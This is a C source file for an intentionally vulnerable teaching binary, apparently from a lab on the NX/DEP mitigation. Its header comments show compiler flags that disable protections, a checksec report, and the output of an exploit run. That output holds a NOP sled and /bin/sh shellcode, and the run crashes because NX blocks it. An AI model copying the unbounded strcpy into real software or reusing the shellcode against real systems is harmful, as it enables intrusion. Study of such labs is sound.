// gcc vuln_no_nx.c -o vuln_with_nx -fno-stack-protector -no-pie -Wl,-z,norelro -m32

// gdb ./vuln_with_nx

// pwndbg> checksec
// [*] '/home/pwnbox/DEP/binary/vuln_with_nx'
//     Arch:     i386-32-little
//     RELRO:    No RELRO
//     Stack:    No canary found
//     NX:       NX enabled
//     PIE:      No PIE (0x8048000)

// python bypass_no_prot.py INFO
// [+] Starting local process './binary/vuln_with_nx': pid 65946
// [*] Switching to interactive mode
// Hello, I'm your friendly & totally secure binary :)!
// What is your name?
// Hello: \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x901��F1�1��\x80�[1��C\x07\x89\x89C\x0c\xb0\x0b\x8d\x8dS\x0c̀���\xff\xff/bin/sh ��\xff!
// [*] Got EOF while reading in interactive
// $ whoami
// [*] Process './binary/vuln_with_nx' stopped with exit code -11 (SIGSEGV) (pid 65946)
// [*] Got EOF while sending in interactive


#include <stdio.h>
#include <string.h>
#include <stdlib.h>


char totally_secure(char *arg2[])
{
    char buffer[256];
    printf("What is your name?\n");
    strcpy(buffer, arg2[1]);
    printf("Hello: %s!\n", buffer);
}


int main(int argc, char *argv[])
{
 setvbuf(stdin, 0, 2, 0);
 setvbuf(stdout, 0, 2, 0);
 printf("Hello, I'm your friendly & totally secure binary :)!\n");
 totally_secure(argv);
 return 0;
}